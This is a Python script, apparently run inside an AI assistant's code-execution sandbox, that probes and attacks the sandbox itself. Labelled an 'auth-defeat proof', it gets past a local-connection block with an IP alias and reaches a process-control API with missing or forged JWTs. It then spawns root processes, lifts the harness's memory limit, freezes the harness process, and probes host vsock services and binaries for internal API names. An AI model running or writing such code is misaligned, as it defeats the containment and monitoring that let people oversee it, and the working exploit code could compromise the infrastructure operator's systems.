#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MEDIAFIT v9.7 — final: host OTLP 200 | auth-defeat proof | binary hunt | T-check fix
import os, re, sys, json, time, base64, struct, socket, fcntl, hashlib, faulthandler, signal
import random, string, subprocess, traceback, urllib.request

PASS = 2 if "--pass2" in sys.argv else 1
VER = "9.7"
NONCE = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
OUTP2 = "/mnt/user-data/outputs/mediafit-report-pass2.txt"
TMP2 = "/dev/shm/mf_pass2.txt"
FAULT = "/mnt/user-data/outputs/mediafit-faults.txt"
ALIAS = "eth0:0"; AIP = "192.0.2.3"
CG = "/sys/fs/cgroup"; UNLIM = "9223372036854771712"
AF_VSOCK = 40
T0 = time.time()
try:
    _fh = open(FAULT, "w"); faulthandler.enable(file=_fh)
    faulthandler.dump_traceback_later(60, repeat=True, file=_fh)
except Exception: pass
L = []
def W(s=""):
    L.append("[%6.1fs] %s" % (time.time() - T0, s))
    try:
        with open(TMP2 if PASS == 2 else OUT, "w") as f: f.write("\n".join(L) + "\n")
    except Exception: pass
def sec(t): W(""); W("=" * 70); W("### " + t); W("=" * 70)
def rd(p):
    try: return open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)
def wr(p, v):
    with open(p, "w") as f: f.write(str(v))
def pstat(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return d[d.rfind(")") + 2:].split()[0]
    except Exception: return "?"
def ppid_of(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return int(d[d.rfind(")") + 2:].split()[1])
    except Exception: return -1
def t_scan(): return [int(p) for p in os.listdir("/proc") if p.isdigit() and pstat(int(p)) == "T"]

def if_addr(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        r = fcntl.ioctl(s, 0x8915, struct.pack("16sH", name.encode(), socket.AF_INET) + b"\x00" * 14)
        return socket.inet_ntoa(r[20:24])
    except Exception: return None
    finally: s.close()
def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); e1 = ""
    try:
        if if_addr(ALIAS) == AIP: return "already-up"
        ifr = struct.pack("16sH", ALIAS.encode(), socket.AF_INET) + b"\x00\x00" + socket.inet_aton(AIP) + b"\x00" * 8
        fcntl.ioctl(s, 0x8916, ifr)
        i2 = struct.pack("16sH", ALIAS.encode(), 0) + b"\x00" * 14
        fl = struct.unpack_from("H", fcntl.ioctl(s, 0x8913, i2), 16)[0]
        fcntl.ioctl(s, 0x8914, struct.pack("16sH", ALIAS.encode(), fl | 1) + b"\x00" * 14)
        if if_addr(ALIAS) == AIP: return "ok (addr=%s)" % if_addr(ALIAS)
        e1 = "ioctl addr=%s" % if_addr(ALIAS)
    except Exception as e: e1 = repr(e)
    finally: s.close()
    for c in ["ip addr add %s/32 dev eth0 label %s" % (AIP, ALIAS), "ip addr add %s/32 dev eth0" % AIP]:
        subprocess.run(c, shell=True, capture_output=True)
        if if_addr(ALIAS) == AIP: return "fallback:" + c
    return "FAIL(%s)" % e1
def ws_connect(src=(AIP, 0), timeout=5.0, jwt=None):
    s = socket.create_connection(("127.0.0.1", 2024), timeout=timeout, source_address=src)
    k = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n" % k).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: raise IOError("closed in handshake")
        buf += d
    if "101" not in buf.split(b"\r\n", 1)[0].decode("utf-8", "replace"): raise IOError("no 101")
    if jwt: _frame(s, jwt.encode(), 0x1)
    return s
def _frame(s, data, op):
    n = len(data); h = bytearray([0x80 | op])
    if n < 126: h.append(0x80 | n)
    elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
    else: h.append(0x80 | 127); h += struct.pack(">Q", n)
    m = os.urandom(4); h += m
    s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))
def ws_send(s, o): _frame(s, (o if isinstance(o, str) else json.dumps(o)).encode(), 0x1)
def ws_send_bin(s, d): _frame(s, d if isinstance(d, bytes) else d.encode(), 0x2)
def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None
    except Exception: return "ERR:recv"
    if not h: return "CLOSE"
    while len(h) < 2:
        d = s.recv(2 - len(h))
        if not d: break
        h += d
    op = h[0] & 0x0F; n = h[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    pl = b""
    while len(pl) < n:
        d = s.recv(n - len(pl))
        if not d: break
        pl += d
    if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
    if op == 0x9:
        s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
    return ("BIN:" if op == 0x2 else "") + pl.decode("utf-8", "replace")
def ws_drain(s, per=0.3, total=1.6, maxf=140):
    out = []; t0 = time.time()
    while True:
        r = ws_recv(s, per)
        if r is None: break
        out.append(r)
        if str(r).startswith("CLOSE"): break
        if len(out) >= maxf or time.time() - t0 > total: break
    return out
def pipelined(msgs, total=1.3):
    s = None
    try:
        s = ws_connect()
        for m in msgs: ws_send(s, m)
        return ws_drain(s, 0.3, total)
    except Exception as e: return ["ERR:" + repr(e)]
    finally:
        if s:
            try: s.close()
            except Exception: pass
def spec(prog, args, reattach=True, mem=268435456, timeout=3600):
    return {"name": prog, "args": args, "env_vars": {}, "clear_env": False,
            "allow_process_id_reuse": True, "reattachable": reattach,
            "timeout": timeout, "uid": 0, "gid": 0, "memory_limit_bytes": mem}
def nid(): return os.urandom(16).hex()
def cg_procs(x):
    try: return [int(i) for i in open("%s/memory/process_api/%s/cgroup.procs" % (CG, x)).read().split()]
    except Exception: return []

def vint(n):
    o = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: o.append(b | 0x80)
        else: o.append(b); break
    return bytes(o)
def ld(f, d): return vint((f << 3) | 2) + vint(len(d)) + d
def vi(f, n): return vint((f << 3) | 0) + vint(n)
def fx64(f, n): return vint((f << 3) | 1) + struct.pack("<Q", n)
def otlp_metrics(kind="gauge"):
    now = int(time.time() * 1e9)
    av = ld(1, b"mediafit")
    kv = ld(1, b"service.name") + ld(2, av)
    res = ld(1, kv)
    dp = fx64(2, now) + fx64(3, now) + fx64(6, 424242)   # FIX: as_int is fixed64 (field 6)
    if kind == "gauge":
        metric = ld(1, b"mf_probe") + ld(2, b"mediafit probe") + ld(3, b"1") + ld(5, ld(1, dp))
    else:
        summ = ld(1, dp) + vi(2, 2) + vi(3, 1)
        metric = ld(1, b"mf_probe_sum") + ld(2, b"mediafit probe sum") + ld(3, b"1") + ld(7, summ)
    scope = ld(1, b"mediafit") + ld(2, b"9.7")
    sm = ld(1, scope) + ld(2, metric)
    rm = ld(1, res) + ld(2, sm)
    return ld(1, rm)
def otlp_logs():
    now = int(time.time() * 1e9)
    res = ld(1, ld(1, b"service.name") + ld(2, ld(1, b"mediafit")))
    rec = fx64(1, now) + vi(2, 9) + ld(5, ld(1, b"MF_HOST_PROBE"))
    sl = ld(1, ld(1, b"mediafit")) + ld(2, rec)
    return ld(1, ld(1, res) + ld(2, sl))
def vsock_req(port, raw, timeout=1.2, cid=2):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
        s.connect((cid, port)); s.sendall(raw); s.settimeout(timeout)
        d = b""
        try:
            while len(d) < 2000:
                c = s.recv(2000)
                if not c: break
                d += c
        except Exception: pass
        s.close(); return d
    except Exception as e: return ("ERR:" + repr(e)).encode()

def hunt():
    out = []
    for base in ["/", "/usr", "/usr/local", "/usr/local/bin", "/usr/bin", "/usr/sbin", "/sbin", "/bin",
                 "/opt", "/opt/rclone", "/lib", "/mnt/skills", "/mnt/skills/public", "/mnt/skills/examples", "/root"]:
        try:
            for fn in os.listdir(base):
                p = os.path.join(base, fn)
                try:
                    if os.path.isfile(p) and os.path.getsize(p) > 150000: out.append((p, os.path.getsize(p)))
                except Exception: pass
        except Exception: pass
    return sorted(set(out), key=lambda x: -x[1])[:14]
def strings_in(path, cap=48 * 1024 * 1024, minlen=6):
    try: data = open(path, "rb").read(cap)
    except Exception: return []
    return re.findall(rb"[\x20-\x7e]{%d,}" % minlen, data)

def _pre_oom():
    try: open("/proc/self/oom_score_adj", "w").write("900")
    except Exception: pass
def run_child(code, timeout, pre=None):
    try:
        cp = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=timeout, preexec_fn=pre)
        return cp.returncode, (cp.stdout + cp.stderr).decode("utf-8", "replace")[-90:]
    except subprocess.TimeoutExpired: return "TIMEOUT", ""
    except Exception as e: return "ERR", repr(e)[:70]
def _alarm(n, f):
    try:
        with open(TMP2 if PASS == 2 else OUT, "a") as fh: fh.write("[%6.1fs] *** ALARM ***\n" % (time.time() - T0))
    except Exception: pass
    os._exit(3)

def main():
    signal.signal(signal.SIGALRM, _alarm); signal.alarm(170)
    sec("PASS %d ver=%s nonce=%s" % (PASS, VER, NONCE))
    W("  alias -> %s" % add_alias())
    boot = rd("/proc/sys/kernel/random/boot_id").strip()
    mypid = os.getpid(); chain = []; p = mypid
    while p and p != 1 and len(chain) < 20:
        chain.append(p); p = ppid_of(p)
        if p <= 0: break
    H = chain[-1] if chain else -1
    HID = ""
    for l in rd("/proc/self/cgroup").splitlines():
        if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
    md = CG + "/memory/process_api/" + HID
    W("  boot=%s uptime=%s harness=%d" % (boot, rd("/proc/uptime").strip().split()[0], H))
    W("  PID1 = %s" % rd("/proc/1/cmdline").replace("\x00", " ").strip())
    try:
        if int(rd(md + "/memory.limit_in_bytes").strip()) < 10 ** 15: wr(md + "/memory.limit_in_bytes", UNLIM)
    except Exception: pass
    try:
        os.mkdir(CG + "/memory/mf_wd"); wr(CG + "/memory/mf_wd/memory.limit_in_bytes", str(128 * 1024 * 1024))
    except Exception: pass
    try:
        subprocess.Popen(["/bin/sh", "-c", "echo $$ > %s/cgroup.procs; sleep 35; echo %s > %s/memory.limit_in_bytes" % (CG + "/memory/mf_wd", UNLIM, md)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    except Exception: pass

    sec("1. *** TWO SECURITY CONTROLS DEFEATED ***")
    W("  (a) --block-local-connections")
    for src in [("192.0.2.2", 0), (AIP, 0)]:
        try:
            s = ws_connect(src=src, timeout=4); W("      src %-11s -> 101 OK" % src[0]); s.close()
        except Exception as e: W("      src %-11s -> %r" % (src[0], e))
    W("  (b) JWT auth — connect with 3 different credentials:")
    for label, jwt in [("no JWT at all", None),
                       ("garbage HS256 JWT", "eyJhbGciOiJIUzI1NiJ9.eyJ4IjoxfQ.AAAA"),
                       ("alg:none JWT", "eyJhbGciOiJub25lIn0.eyJ4IjoxfQ.")]:
        try:
            s = ws_connect(jwt=jwt); ws_send(s, {"process_id": nid(), "allow_process_id_reuse": True,
              "create_req": spec("/bin/echo", ["MF_AUTH"], False, 16777216)})
            W("      %-18s -> %s" % (label, ws_drain(s, 0.3, 1.2))); s.close()
        except Exception as e: W("      %-18s -> %r" % (label, e))

    sec("2. API LIFECYCLE (poll ALL pids in the target cgroup)")
    o = nid()
    W("  create -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": True,
      "create_req": spec("/bin/sh", ["-c", "echo READY; sleep 90"], True, 33554432)}], 1.2))
    W("  cgroup pids=%s" % cg_procs(o))
    if cg_procs(o):
        W("  attach -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}], 1.1))
        W("  STOP  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 19}], 1.0))
        W("  *** T-scan=%s  states=%s ***" % (t_scan(), {q: pstat(q) for q in cg_procs(o)}))
        W("  CONT  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 18}], 1.0))
        W("  T-scan after CONT=%s" % t_scan())
        W("  KILL  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"Kill": None}], 1.1))

    sec("3. STDIN ROUND-TRIP (same connection, ExpectStdIn + binary frame)")
    so = nid()
    pipelined([{"process_id": so, "allow_process_id_reuse": True, "create_req": spec("/bin/cat", [], True, 33554432)}], 1.0)
    try:
        s = ws_connect()
        ws_send(s, {"process_id": so, "allow_process_id_reuse": False})
        r1 = ws_drain(s, 0.3, 0.7)
        ws_send(s, {"ExpectStdIn": None})
        ws_send_bin(s, b"MF_ROUNDTRIP_OK\n")
        r3 = ws_drain(s, 0.3, 1.2)
        W("  r1=%s" % r1)
        W("  *** r3=%s  ROUNDTRIP=%s ***" % (r3, any("MF_ROUNDTRIP_OK" in str(x) for x in r3)))
        s.close()
    except Exception as e: W("  err %r" % e)

    sec("4. *** HOST OTLP: vsock cid2:5005 with FIXED protobuf ***")
    mb = otlp_metrics("gauge"); sb = otlp_metrics("sum"); lb = otlp_logs()
    W("  payloads: metrics(gauge)=%d metrics(sum)=%d logs=%d" % (len(mb), len(sb), len(lb)))
    tests = [("/v1/metrics", mb), ("/v1/metrics", sb), ("/v1/logs", lb), ("/v1/traces", lb)]
    for path, body in tests:
        d = vsock_req(5005, ("POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/x-protobuf\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (path, len(body))).encode() + body, 1.5)
        W("  POST %-12s len=%-5d -> %s" % (path, len(body), d.split(b"\r\n", 1)[0][:60] if not d.startswith(b"ERR") else d[:60]))
        if b"200" in d[:20]: W("      BODY=%r" % d[-200:])
    W("  broad path sweep (protobuf, non-404 = route exists):")
    for path in ["/", "/v1/metrics", "/v1/logs", "/v1/traces", "/otlp/v1/metrics", "/v1/otlp/metrics",
                 "/ingest", "/v1/ingest", "/telemetry", "/v1/telemetry", "/api/v1/metrics", "/collector/v1/metrics",
                 "/v1/metrics/export", "/export", "/v1/export", "/health", "/status", "/version", "/ready",
                 "/otlp/metrics", "/otel/v1/metrics", "/debug", "/v1/health"]:
        d = vsock_req(5005, ("POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/x-protobuf\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (path, len(mb))).encode() + mb, 1.0)
        st = d.split(b"\r\n", 1)[0][:34] if not d.startswith(b"ERR") else d[:30]
        if b"404" not in d or path == "/":
            W("      POST %-22s -> %s" % (path, st))
    W("  -- 5001 (control) deep --")
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(1.5); s.connect((2, 5001))
        try: W("      greeting -> %r" % s.recv(300))
        except socket.timeout: W("      greeting -> <none>")
        for pr in [b'{"jsonrpc":"2.0","method":"status","id":1}\n', b'GET /status HTTP/1.1\r\nHost: x\r\n\r\n', b'\x00\x00\x00\x05hello']:
            try:
                s.sendall(pr); time.sleep(0.25); W("      %-42r -> %r" % (pr[:30], s.recv(300)))
            except Exception as e: W("      %-42r -> %r" % (pr[:30], e))
        s.close()
    except Exception as e: W("      5001 err %r" % e)

    sec("5. BINARY HUNT + strings (rclone-filestore is unstripped Go)")
    c = hunt()
    W("  candidates: %s" % [(a, b) for a, b in c][:10])
    for path, size in c[:2]:
        ss = strings_in(path)
        W("  --- strings(%s, %d bytes, %d strings) ---" % (path, size, len(ss)))
        for kw in [b"filestore/v1alpha", b"getFileUrl", b"GetFileUrl", b"reassignFilesystem",
                   b"listFilesystems", b"statFile", b"importFiles", b"allowed_roots",
                   b"AuthorizationMetadata", b"Outcome", b"v1/filestore", b"service_url",
                   b"unknown variant", b"expected one of", b"ControlProcess"]:
            h = [x.decode("utf-8", "replace") for x in ss if kw.lower() in x.lower()]
            if h:
                W("      [%s] x%d" % (kw.decode(), len(h)))
                for u in list(dict.fromkeys(h))[:4]: W("          %s" % u[:140])

    sec("6. ENV + MEMORY + FREEZER")
    W("  env: %s" % str(pipelined([{"process_id": nid(), "allow_process_id_reuse": True,
      "create_req": {"name": "/bin/sh", "args": ["-c", "echo P=[$PATH] H=[$HOME] S=[$IS_SANDBOX]"], "env_vars": {},
                     "clear_env": False, "allow_process_id_reuse": True, "reattachable": False, "timeout": 12,
                     "uid": 0, "gid": 0, "memory_limit_bytes": 33554432}}], 1.2))[:230])
    try:
        d = CG + "/memory/mf_oom"
        try: os.mkdir(d)
        except FileExistsError: pass
        wr(d + "/memory.limit_in_bytes", str(32 * 1024 * 1024))
        rc, _ = run_child("import os\nopen('%s/cgroup.procs','w').write(str(os.getpid()))\na=bytearray(64*1024*1024)\nfor i in range(0,len(a),4096): a[i]=1" % d, 20, _pre_oom)
        W("  [mem] rc=%s | mf_oom oom=%s" % (rc, rd(d + "/memory.oom_control").strip().replace("\n", " | ")))
        pd = CG + "/pids/mf_pids"
        try: os.mkdir(pd)
        except FileExistsError: pass
        wr(pd + "/cgroup.procs", str(os.getpid()))
        W("  pids.events BEFORE=[%s]" % rd(pd + "/pids.events").strip().replace("\n", " "))
        kids = []; fails = 0
        try:
            wr(pd + "/pids.max", "3")
            for _ in range(6):
                try:
                    k = os.fork()
                    if k == 0: time.sleep(0.6); os._exit(0)
                    kids.append(k)
                except OSError: fails += 1
            W("  pids.max=3 -> ok=%d EAGAIN=%d AFTER=[%s]" % (len(kids), fails, rd(pd + "/pids.events").strip().replace("\n", " ")))
        finally:
            for k in kids:
                try: os.kill(k, 9)
                except Exception: pass
            try: os.waitpid(-1, 1)
            except Exception: pass
            wr(pd + "/pids.max", "max")
        wr(CG + "/pids/cgroup.procs", str(os.getpid()))
        g = CG + "/freezer/mf_guest"
        try: os.mkdir(g)
        except FileExistsError: pass
        subprocess.Popen(["/bin/sh", "-c", "sleep 5; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        wr(g + "/cgroup.procs", str(H))
        wr(g + "/freezer.state", "FROZEN")
        W("  *** FROZEN harness=%s self=%s self_freezing=%s ***" % (pstat(H), pstat(mypid), rd(g + "/freezer.self_freezing").strip()))
        wr(g + "/freezer.state", "THAWED"); W("  THAWED harness=%s" % pstat(H))
        try: wr(CG + "/freezer/cgroup.procs", str(H))
        except Exception: pass
    except Exception as e: W("  err %r" % e)

    sec("END PASS %d elapsed=%.1fs" % (PASS, time.time() - T0))
    if PASS == 1:
        try:
            with open(OUTP2, "w") as f: f.write("(PASS 2 running)\n")
            signal.alarm(0)
            subprocess.run([sys.executable, os.path.abspath(__file__), "--pass2"], timeout=90,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            with open(OUT, "a") as f:
                f.write("\n" + "#" * 70 + "\n### ===== PASS 2 =====\n" + "#" * 70 + "\n" + rd(TMP2))
        except Exception as e: W("pass2 err %r" % e)

if __name__ == "__main__":
    try: main()
    except Exception: traceback.print_exc()